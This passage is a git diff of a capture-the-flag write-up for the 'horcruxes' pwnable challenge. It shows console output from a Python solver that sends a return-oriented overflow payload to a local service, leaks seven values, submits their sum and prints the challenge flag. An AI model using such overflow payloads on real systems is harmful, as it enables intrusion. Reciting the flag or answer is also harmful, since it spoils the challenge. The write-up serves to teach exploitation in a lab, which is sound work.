@@ -124,27 +124,27 @@ func_G_addr = 0x0809FF05
 So we can execute these functions one by one and get the values of `a`, `b`, `c`, `d`, `e`, `f` and `g`. After that, execute `ropme()` again and input the right sum to get flag.
 
 ```
-horcruxes@ubuntu:/tmp/solve2$ python2 ./solve.py
+horcruxes@ubuntu:/tmp/solve2$ python2 ./solve.py 
 [+] Opening connection to localhost on port 9032: Done
-Voldemort concealed his splitted soul inside 7 horcruxes. 1
-
+Voldemort concealed his splitted soul inside 7 horcruxes.
 Find all horcruxes, and destroy it!
 
-Select Menu: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\x00aaaK\xfe   j\xfe   \x89\xfe   \xa8\xfe   ��   ��      \x05\xff   ��
-How many EXP did you earned? : You'd better get more experience to kill Voldemort
-You found "Tom Riddle's Diary" (EXP +-1507646648)
-You found "Marvolo Gaunt's Ring" (EXP +-996987795)
-You found "Helga Hufflepuff's Cup" (EXP +-1433450306)
-You found "Salazar Slytherin's Locket" (EXP +-1973078909)
-You found "Rowena Ravenclaw's Diadem" (EXP +1200843919)
-You found "Nagini the Snake" (EXP +-1953066712)
-You found "Harry Potter" (EXP +-1198887645)
+Select Menu: 1
+How many EXP did you earned? :  00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\x00aaaK\xfe   j\xfe   \x89\xfe   \xa8\xfe   ��   ��  \x05\xff   ��   
+You'd better get more experience to kill Voldemort
+You found "Tom Riddle's Diary" (EXP +15452973)
+You found "Marvolo Gaunt's Ring" (EXP +-1153331378)
+You found "Helga Hufflepuff's Cup" (EXP +-1491435822)
+You found "Salazar Slytherin's Locket" (EXP +129335114)
+You found "Rowena Ravenclaw's Diadem" (EXP +-1692814741)
+You found "Nagini the Snake" (EXP +-1940301612)
+You found "Harry Potter" (EXP +94303011)
 
 Select Menu: 1
-How many EXP did you earned? :  727660496
+How many EXP did you earned? :  -1743825159
 Magic_spell_1s_4vad4_K3daVr4!
 
 [*] Closed connection to localhost port 9032
-horcruxes@ubuntu:/tmp/solve2$
+horcruxes@ubuntu:
 ```
 
